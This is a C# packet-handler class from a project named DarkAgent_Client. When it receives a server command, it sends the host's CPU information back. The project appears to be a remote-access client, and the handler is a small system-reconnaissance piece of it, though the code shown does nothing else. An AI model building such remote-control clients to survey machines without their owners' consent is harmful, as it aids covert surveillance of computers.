using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Network;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_GetCpuInfo : ReceiveBasePacket
    {
        public R_GetCpuInfo(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        public override void Read()
        {
        }

        public override void Run()
        {
            //Send cpu info
            Client.SendPacket(new S_GetCpuInfo(Client));
        }
    }
}
